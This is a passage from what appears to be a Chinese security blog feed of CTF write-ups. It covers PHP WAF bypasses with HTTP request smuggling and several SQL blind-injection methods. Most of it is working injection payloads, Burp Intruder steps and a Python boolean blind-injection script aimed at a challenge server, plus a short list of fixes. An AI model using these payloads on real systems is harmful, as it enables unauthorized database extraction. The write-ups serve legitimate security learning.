@readfile() 形式调用该函数，来隐藏错误信息。<br><img src="http://img-blog.csdnimg.cn/20191027192244482.png" alt="在这里插入图片描述"></p><h5 id="HTTP走私绕过WAF"><a href="#HTTP走私绕过WAF" class="headerlink" title="HTTP走私绕过WAF"></a>HTTP走私绕过WAF</h5><p><strong>测试示例</strong><br><em>1、HTTP请求走私测试2(CL-CL漏洞)</em><br>两个CL直接导致前端转发的服务器400，而且完整转发了post包给后端。<br><img src="http://img-blog.csdnimg.cn/20191027210318818.png" alt="在这里插入图片描述"><br><em>2、HTTP请求走私测试1(CL-TE漏洞)</em><br>CL和TE直接导致前端转发的服务器400，而且完整转发了post包给后端。<br><img src="http://img-blog.csdnimg.cn/20191027211030391.png" alt="在这里插入图片描述"><br>其它几种请求走私依旧可以，就不测试了。</p><p><strong>构造payload获得Flag</strong><br>使用<code>scandir()函数</code>、<code>readfile()函数</code>、<code>base_convert()函数</code>、<code>dechex() 函数</code>、<code>hex2bin() 函数</code>（<code>chr()函数</code>）<br>36进制<code>scandir</code>-&gt;10进制61693386291<br>36进制<code>readfile</code>-&gt;10进制2146934604002<br>ascii码<code>/</code>-&gt;16进制2f-&gt;10进制47<br>36进制f1agg-&gt;10进制25254448(读取根目录得到的)<br><em>1、列目录</em><br>首先要使用<code>scandir()函数</code>，尝试构造payload列举根目录下的文件。<br><code>scandir()</code>可以用<code>base_convert()函数</code>构造，但是利用<code>base_convert()</code>只能解决<code>a~z</code>的利用。<br>因为根目录需要<code>/</code>符号，且不在<code>a~z</code>,所以需要<code>hex2bin(dechex(47))</code>这种构造方式，<code>dechex() 函数</code>把十进制数转换为十六进制数。<code>hex2bin() 函数</code>把十六进制值的字符串转换为 ASCII 字符。当然，也可以直接用<code>chr()函数</code></p><p>payload</p><pre><code class="bash">var_dump(base_convert(61693386291,10,36)(chr(47)))</code></pre><p><img src="http://img-blog.csdnimg.cn/20191027230032401.png" alt="在这里插入图片描述"><br><em>2、读取flag</em></p><p>payload</p><pre><code class="bash">var_dump(base_convert(2146934604002,10,36)(chr(47).base_convert(25254448,10,36)))</code></pre><p><img src="http://img-blog.csdnimg.cn/20191027230520431.png" alt="在这里插入图片描述"></p><h5 id="PHP字符串解析特性绕过WAF"><a href="#PHP字符串解析特性绕过WAF" class="headerlink" title="PHP字符串解析特性绕过WAF"></a>PHP字符串解析特性绕过WAF</h5><p>输入时发现num只能输入数字，输入字符无法解析。<br>这里可以利用php的字符串解析特性绕过bypass：<a href="http://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p><blockquote><p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>1.删除空白符<br>2.将某些字符转换为下划线（包括空格）</p></blockquote><p>所以我们可以在num前加个空格绕过waf</p><pre><code class="php">http://www.xxx.com/index.php? num=aaaa</code></pre><p>现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样代码还能正常运行，还上传了非法字符。<br>然后再利用<code>scandir()</code>函数，列出 <code>参数目录</code> 中的文件和目录。<br>首先，要先扫根目录下的所有文件，也就是是<code>scandir(&quot;/&quot;)</code>,因为<code>/</code>被过滤了，所以直接用<code>chr(“47”)</code>绕过,发现<code>flagg文件</code><br><img src="http://img-blog.csdnimg.cn/20191027224037312.png" alt="在这里插入图片描述"><br>然后再去读取这个文件就行了。payload：</p><pre><code class="php">calc.php? num=1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></pre><p><img src="http://img-blog.csdnimg.cn/20191027224312299.png" alt="在这里插入图片描述"></p><h3 id="0x06-漏洞修复"><a href="#0x06-漏洞修复" class="headerlink" title="0x06 漏洞修复"></a>0x06 漏洞修复</h3><p>1、将前端服务器配置为只使用HTTP/2与后端系统通信<br>2、完全禁用后端连接重用来解决此漏洞的所有变体<br>3、确保连接中的所有服务器运行具有相同配置的相同web服务器软件。<br>4、彻底拒绝模糊的请求，并删除关联的连接。<br>5、在Burp Suite中，你可以使用Repeater菜单禁用此行为，确保你选择的工具具有相同的功能。<br>6、通过Squid之类的代理来测试他们的测试人员的流量以进行监控。破坏测试人员发起的任何走私攻击请求，确保对此漏洞做到全面杜绝。</p><h3 id="0x07-写在后面"><a href="#0x07-写在后面" class="headerlink" title="0x07 写在后面"></a>0x07 写在后面</h3><p>这次又学到了新的知识-HTTP请求走私。了解了HTTP请求走私的五种方式，以及一些PHP函数的使用。HTTP请求走私属于协议层攻击，是服务器漏洞的一种，应予以注意。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 协议层漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 题目复现 </tag>
            
            <tag> HTTP </tag>
            
            <tag> HTTP请求走私 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL盲注的简单分析</title>
      <link href="/2019/10/26/SQL%E7%9B%B2%E6%B3%A8%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
      <url>/2019/10/26/SQL%E7%9B%B2%E6%B3%A8%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><strong>首发于先知社区</strong></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做了些基于布尔盲注和基于时间盲注的CTF题，掌握了CTF题中SQL盲注的三种解法，收获很大，于是结合题目分享一下。</p><h2 id="BASE-Blind-Inject"><a href="#BASE-Blind-Inject" class="headerlink" title="BASE-Blind-Inject"></a>BASE-Blind-Inject</h2><h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><p><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190727173029-2c674382-b051-1.jpg" alt></p><h3 id="题干分析"><a href="#题干分析" class="headerlink" title="题干分析"></a>题干分析</h3><p>第一次走进误区，刚看到这道题的时候<br><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190727174046-9c3c76f4-b052-1.jpg" alt><br>看到了登录框，第一印象应该就是简单的闭合注入，测试后发现是双引号闭合，所以构造payload注入</p><pre><code class="sql">&quot; or 1=1#</code></pre><p><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190727174812-a61b52b6-b053-1.jpg" alt><br>果然注入进去了。虽然没有出现flag，但给予了提示“flag就在数据库里面”，然后又想到题目标题，翻译成“简单盲注”<br>并且flag在数据库？有页面返回？所以应该想到这是SQL注入的一种注入方式叫做布尔盲注,并且是POST型。</p><h3 id="知识了解"><a href="#知识了解" class="headerlink" title="知识了解"></a>知识了解</h3><p><strong>布尔盲注</strong></p><ol><li>布尔盲注利用前提<br> 页面没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。</li><li>布尔盲注利用</li></ol><ul><li>该语句判断数据库个数，当数据库个数大于n页面显示正常<pre><code class="sql">(select count(schema_name) from information_schema.schemata)&gt; n</code></pre></li><li>该语句判断数据库内第一个数据库名有多少字符，字符个数大于n页面显示正常<pre><code class="sql">(select length(schema_name) from information_schema.schemata limit 0,1)&gt; n</code></pre></li><li>该语句判断第一个库第一个字符是什么，ascii值大于n页面显示正常<pre><code class="sql">(select ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)))&gt;n</code></pre></li></ul><p><strong>相关函数</strong></p><ul><li>Length()函数 返回字符串的长度</li><li>substr()截取字符串，偏移是从1开始，而不是0开始</li><li>ascii()返回字符的ascii码</li><li>count(column_name)函数返回指定列的值的数目(NULL 不计入)</li></ul><h3 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h3><ol><li>测闭合方式<br> 输入’ or 1=1#不回显<br> 输入” or 1=1#正常<br> 可判定是双引号闭合。</li><li>测长度<br> 判断数据库名的长度<br> 输入” or (length(database())=10)–+正常<br> 说明长度为8。</li><li>测字符<br> 用substr()截取字符串的每个字符，ascii()将字符串转换成其ASCII码<br> 输入” or (ascii(substr(database(),1,1))&gt;97)–+正常</li></ol><h3 id="盲注开始"><a href="#盲注开始" class="headerlink" title="盲注开始"></a>盲注开始</h3><h4 id="费心劳神-手工盲注"><a href="#费心劳神-手工盲注" class="headerlink" title="费心劳神-手工盲注"></a>费心劳神-手工盲注</h4><p>利用二分法进行手工盲注。手工盲注可以使用BurpSuite，构造payload在Repeater点击Go进行发包，这样会比较便捷。<br>1.猜库<br>用到获取当前数据库函数<code>database()</code></p><ul><li><p>猜库长</p><pre><code class="sql">&quot; or (length(database())=10)--+正常</code></pre><p><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812192807-41aa4690-bcf4-1.jpg" alt><br>所以数据库长度为10</p></li><li><p>猜库名<br>第一个字符</p><pre><code class="sql">&quot; or (ascii(substr(database(),1,1))&gt;32)--+正常&quot; or (ascii(substr(database(),1,1))&gt;128)--+不回显&quot; or (ascii(substr(database(),1,1))&gt;80)--+正常&quot; or (ascii(substr(database(),1,1))&gt;104)--+不回显&quot; or (ascii(substr(database(),1,1))&gt;92)--+正常&quot; or (ascii(substr(database(),1,1))&gt;98)--+正常&quot; or (ascii(substr(database(),1,1))&gt;101)--+不回显&quot; or (ascii(substr(database(),1,1))&gt;100)--+不回显&quot; or (ascii(substr(database(),1,1))&gt;99)--+不回显</code></pre><p><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812192942-7a47141a-bcf4-1.jpg" alt><br><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812201425-b995d5ec-bcfa-1.jpg" alt><br>说明数据库名的第一个字符ASCII码为99，即“c”。<br>第二个字符</p><pre><code class="sql">&quot; or (ascii(substr(database(),2,1))&gt;32)--+正常&quot; or (ascii(substr(database(),2,1))&gt;128)--+不回显&quot; or (ascii(substr(database(),2,1))&gt;80)--+正常&quot; or (ascii(substr(database(),2,1))&gt;104)--+不回显&quot; or (ascii(substr(database(),2,1))&gt;92)--+正常&quot; or (ascii(substr(database(),2,1))&gt;98)--+正常&quot; or (ascii(substr(database(),2,1))&gt;101)--+正常&quot; or (ascii(substr(database(),2,1))&gt;102)--+正常&quot; or (ascii(substr(database(),2,1))&gt;103)--+正常</code></pre><p>说明数据库名的第二个字符ASCII码为104，即“h”。<br>依次猜解，最终得到数据库名：<code>challenges</code></p></li></ul><p>2.猜表</p><ul><li><p>猜表长</p><pre><code class="sql">&quot; or (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6)--+正常</code></pre><p>所以数据表长度为6</p></li><li><p>猜表名<br>第一个字符</p><pre><code class="sql">&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;32)--+正常&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;128)--+不回显&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80)--+正常&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;104)--+正常&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;116)--+正常&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;122)--+不回显&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;119)--+不回显&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;119)--+不回显&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;118)--+不回显&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117)--+不回显</code></pre><p>说明数据表名的第一个字符ASCII码为117，即“u”。<br>依次猜解，最终得到数据表名：<code>user_2</code></p></li></ul><p>3.猜字段</p><ul><li><p>猜字段长</p><pre><code class="sql">&quot; or (length((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1))=2)--+正常</code></pre><pre><code class="sql">&quot; or (length((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 1,1))=8)--+正常</code></pre><pre><code class="sql">&quot; or (length((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 2,1))=8)--+正常</code></pre><p>所以user_2表的数据字段长度分别为2、8、8</p></li><li><p>猜字段名<br>第一个字段</p><pre><code class="sql">&quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;32)--+正常&quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;128)--+不回显&quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;80)--+正常&quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;104)--+正常&quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;116)--+不回显&quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;110)--+不回显&quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;107)--+不回显&quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;106)--+不回显&quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;105)--+不回显</code></pre><p>所以user_2表的第一个字段的字段名的第一个字符ASCII码为105，即“i”。<br>猜第二个字段把limit 0,1改为limit 1,1<br>猜第三个字段把limit 0,1改为limit 2,1<br>依次猜解,最终得到user_2表的3个字段名分别为：<code>id</code> <code>username</code> <code>password</code></p></li></ul><p>3.猜数据</p><ul><li><p>猜数据长</p><pre><code class="sql">&quot; or (length((select password from challenges.user_2 limit 1,1))=32)--+正常</code></pre><p>所以user_2表的password字段的第2条数据的数据长度为32，这个应该就是flag那条数据了</p></li><li><p>猜数据值</p><pre><code class="sql">&quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;32)--+正常&quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;128)--+不回显&quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;80)--+正常&quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;104)--+不回显&quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;92)--+正常&quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;98)--+正常&quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;101)--+正常&quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;102)--+不回显</code></pre><p>说明user_2表的password字段的第2条数据(limit 1,1意思是从1开始取(即第二条数据)，取一条数据。)的数据值的第一个字符ASCII码为102，即“f”。<br>依次猜解,最终得到flag</p></li></ul><h4 id="简便之法-BurpSuite半自动化盲注"><a href="#简便之法-BurpSuite半自动化盲注" class="headerlink" title="简便之法-BurpSuite半自动化盲注"></a>简便之法-BurpSuite半自动化盲注</h4><p>一步一步的利用二分法进行手工盲注，是不是有点麻烦了呢？能不能让BurpSuite自己进行按顺序进行一个一个猜解呢？<br>于是用到了BurpSuite的一个功能模块Intruder，构造payload设置变量进行爆破，然后根据返回长度进行排序整理。<br>1、爆库<br>payload</p><pre><code class="sql">&quot; or (ascii(substr(database(),§1§,1))=§32§)--+</code></pre><ol><li><p>先随便输入用户名和密码，然后BurpSuite抓包，发送到Intruder<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812200742-c97f3f12-bcf9-1.jpg" alt></p></li><li><p>设置Positions<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812200947-14478324-bcfa-1.jpg" alt><br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812201657-14305b58-bcfb-1.jpg" alt></p></li><li><p>设置两个变量的爆破类型<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812202004-83ea8aea-bcfb-1.jpg" alt><br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812202024-8fdd4130-bcfb-1.jpg" alt></p></li><li><p>开始爆破，根据返回长度确定爆破结果<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812202525-4319f2b6-bcfc-1.jpg" alt></p></li><li><p>排序、转换字符<br> payload2那一列即是数据库名每个字符的ASCII码，按照payload1进行排序，再转换成字符，得到数据库名<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812204433-ef16fb0c-bcfe-1.jpg" alt></p></li></ol><p>2、爆表<br>payload</p><pre><code class="sql">&quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),§1§,1))=§32§)--+</code></pre><ol><li><p>与爆库的不同之处就是payload和结果长度，改一下<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812205426-50fcf0e6-bd00-1.jpg" alt><br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812205859-f3505266-bd00-1.jpg" alt></p></li><li><p>开始爆破，根据返回长度确定爆破结果<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812210349-a06d0b24-bd01-1.jpg" alt></p></li><li><p>排序、转换字符<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812210555-eb6d076e-bd01-1.jpg" alt></p></li></ol><p>3、爆字段<br>payload</p><pre><code class="sql">&quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 2,1),§1§,1))=§32§)--+</code></pre><ol><li><p>与爆库的不同之处就是payload和结果长度，改一下(结果长度改为8)</p></li><li><p>开始爆破，根据返回长度确定爆破结果<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812212116-1065434a-bd04-1.jpg" alt></p></li><li><p>排序、转换字符<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812212230-3c86e8c0-bd04-1.jpg" alt></p></li></ol><p>3、爆数据<br>payload</p><pre><code class="sql">&quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),§1§,1))=§32§)--+</code></pre><ol><li><p>与爆库的不同之处就是payload和结果长度，改一下(结果长度改为32)</p></li><li><p>开始爆破，根据返回长度确定爆破结果<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812213814-6f103a06-bd06-1.jpg" alt></p></li><li><p>排序、转换字符<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812213957-ac97aa9e-bd06-1.jpg" alt></p></li></ol><p><strong>提高效率</strong><br>为了省去转换字符并减少爆破时间，可以选择不使用ascii()函数，第二个变量的爆破类型改成Simple list<br>如：爆库<br>payload</p><pre><code class="sql">&quot; or (substr(database(),§1§,1)=&#39;§a§&#39;)--+</code></pre><p><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812215052-32bd5cbc-bd08-1.jpg" alt><br>爆破结果：<br><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812215333-92c4cbd6-bd08-1.jpg" alt><br>发现没有区分大小写，所以再通过每个字符的ascii码是否大于等于97判断每个字符是大写还是小写，小于97即大写。<br>这样就提高了一点效率。</p><h4 id="神来之笔-脚本盲注"><a href="#神来之笔-脚本盲注" class="headerlink" title="神来之笔-脚本盲注"></a>神来之笔-脚本盲注</h4><p>使用BurpSuite半自动化盲注，看似可以。但是不是有一种方法，可以不用其他操作，轻松得到数据库的信息呢？于是想到使用脚本进行盲注来提高效率。布尔盲注脚本如下：</p><pre><code class="python">import requestschars=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;{}&amp;=+&#39;postdata={    &#39;username&#39;:&#39;&quot; or 1=1#&#39;,    &#39;password&#39;:&#39;admin&#39;    }url=&quot;http://35.201.188.231:9000/challenge-02/post.php&quot;r=requests.post(url,data=postdata)length=len(r.text)def name(url,length):    dbname=&#39;&#39;    print(&quot;数据库名：&quot;,dbname)    payload=&#39;&quot; or ascii(substr(database(),{0},1))={1} #&#39;    #print(&quot;数据表名：&quot;,dbname)    #payload=&#39;&quot;or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}#&#39;    #print(&quot;字段名：&quot;,dbname)    #payload=&#39;&quot;or ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 1,1),{0},1))={1}#&#39;    #print(&quot;数据：&quot;,dbname)    #payload=&#39;&quot; or ascii(substr((select password from user_2 limit 1,1),{0},1))={1}#&#39;    for i in range(1,40):        char=&#39;&#39;        for x in chars:            char_ascii=ord(x)            payloads=payload.format(i,char_ascii)            postdata={            &#39;username&#39;:payloads,            &#39;password&#39;:&#39;admin&#39;            }            r=requests.post(url,data=postdata)            if len(r.text) == length:                dbname+=x                print(dbname)                char=x                break        if char==&#39;&#39;:            break    return dbnamename(url,length)</code></pre><p>测试一下<br><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812222006-4862ce68-bd0c-1.jpg" alt><br>如果传参方式是get传参，只需在url后添加<code>? 参数名=</code>，再将requests.post改成requests.get即可。</p><h2 id="BASE-TIME-BLIND-INJECT"><a href="#BASE-TIME-BLIND-INJECT" class="headerlink" title="BASE-TIME-BLIND-INJECT"></a>BASE-TIME-BLIND-INJECT</h2><h3 id="题目信息-1"><a href="#题目信息-1" class="headerlink" title="题目信息"></a>题目信息</h3><p><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812222615-24388d2e-bd0d-1.jpg" alt></p><h3 id="题干分析-1"><a href="#题干分析-1" class="headerlink" title="题干分析"></a>题干分析</h3><p>第二次走进误区，刚看到这道题的时候<br><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190813202107-d389dec4-bdc4-1.jpg" alt><br>从题目标题看出是时间盲注。试了单引号闭合和和双引号闭合，结果并没有什么用，于是查看了一下源码，发现关键点了。竟然有源码可以下载！<br><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812232412-3cba6e96-bd15-1.jpg" alt><br>查看下载的源码，发现是 <code>&#39;&quot;</code> 闭合，并且传参为POST传参。<br><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812233736-1c2f449c-bd17-1.jpg" alt></p><h3 id="知识了解-1"><a href="#知识了解-1" class="headerlink" title="知识了解"></a>知识了解</h3><p><strong>时间盲注</strong></p><ol><li>时间盲注利用前提<br> 页面上没有显示位，也没有输出SQL语句执行错误信息。 正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，页面的返回速度明显慢了5秒。</li><li>时间盲注利用</li></ol><ul><li>该语句判断数据库个数，当数据库个数等于n页面返回延迟5秒<pre><code class="sql">if((select count(schema_name) from information_schema.schemata)=n,sleep(5),1)</code></pre></li><li>该语句判断数据库内第一个数据库名有多少字符，字符个数等于n页面返回延迟5秒<pre><code class="sql">if((select length(schema_name) from information_schema.schemata limit 0,1)=n,sleep(5),1)</code></pre></li><li>该语句判断第一个库第一个字符是什么，ascii值等于n页面返回延迟5秒<pre><code class="sql">if((select ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)))=n,sleep(5),1)</code></pre></li></ul><p><strong>相关函数</strong></p><ul><li>Length（）函数 返回字符串的长度</li><li>substr（）截取字符串</li><li>ascii（）返回字符的ascii码</li><li>sleep(n)：将程序挂起一段时间 n为n秒</li><li>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</li><li>count(column_name)函数返回指定列的值的数目(NULL 不计入)</li></ul><h3 id="开始测试-1"><a href="#开始测试-1" class="headerlink" title="开始测试"></a>开始测试</h3><ol><li>测试语句<br> 输入’” or if(1=1,sleep(5),1)#延迟5秒<br> 输入’” or if(1=2,sleep(5),1)#正常</li><li>测长度<br> 判断数据库名的长度<br> 输入’” or if((length(database())=10),sleep(5),1)–+延迟5秒<br> 说明长度为8。</li><li>测字符<br> 用substr()截取字符串的每个字符，ascii()将字符串转换成其ASCII码<br> 输入’” or if((ascii(substr(database(),1,1))&gt;97),sleep(5),1)–+延迟5秒</li></ol><h3 id="盲注开始-1"><a href="#盲注开始-1" class="headerlink" title="盲注开始"></a>盲注开始</h3><h4 id="费心劳神-手工盲注-1"><a href="#费心劳神-手工盲注-1" class="headerlink" title="费心劳神-手工盲注"></a>费心劳神-手工盲注</h4><p>同样利用二分法进行手工盲注，与布尔盲注不同之处是页面上没有回显，所以使用了if()函数和sleep()函数，根据返回时间判断。同样可以使用BurpSuite进行测试。<br>1.猜库<br>用到获取当前数据库函数<code>database()</code></p><ul><li><p>猜库长</p><pre><code class="sql">&#39;&quot; or if((length(database())=10),sleep(5),1)--+延迟5秒</code></pre><p><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812235329-5405abb6-bd19-1.jpg" alt><br>所以数据库长度为10</p></li><li><p>猜库名<br>第一个字符</p><pre><code class="sql">&#39;&quot; or if((ascii(substr(database(),1,1))&gt;32),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr(database(),1,1))&gt;128),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr(database(),1,1))&gt;80),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr(database(),1,1))&gt;104),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr(database(),1,1))&gt;92),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr(database(),1,1))&gt;98),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr(database(),1,1))&gt;101),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr(database(),1,1))&gt;100),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr(database(),1,1))&gt;99),sleep(5),1)--+正常</code></pre><p><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812235611-b4895e4c-bd19-1.jpg" alt><br><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812235635-c2dfaf28-bd19-1.jpg" alt><br>说明数据库名的第一个字符ASCII码为99，即“c”。<br>依次猜解，最终得到数据库名：<code>challenges</code></p></li></ul><p>2.猜表</p><ul><li><p>猜表长</p><pre><code class="sql">&#39;&quot; or if((length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6),sleep(5),1)--+延迟5秒</code></pre><p>所以数据表长度为6</p></li><li><p>猜表名<br>第一个字符</p><pre><code class="sql">&#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;32),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;128),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;104),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;116),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;122),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;119),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;119),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;118),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117),sleep(5),1)--+正常</code></pre><p>说明数据表名的第一个字符ASCII码为117，即“u”。<br>依次猜解，最终得到数据表名：<code>user_3</code></p></li></ul><p>3.猜字段</p><ul><li><p>猜字段长</p><pre><code class="sql">&#39;&quot; or if((length((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1))=2),sleep(5),1)--+延迟5秒</code></pre><pre><code class="sql">&#39;&quot; or if((length((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 1,1))=8),sleep(5),1)--+延迟5秒</code></pre><pre><code class="sql">&#39;&quot; or if((length((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 2,1))=8),sleep(5),1)--+延迟5秒</code></pre><p>所以user_3表的数据字段长度分别为2、8、8</p></li><li><p>猜字段名<br>第一个字段</p><pre><code class="sql">&#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;32),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;128),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;80),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;104),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;116),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;110),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where 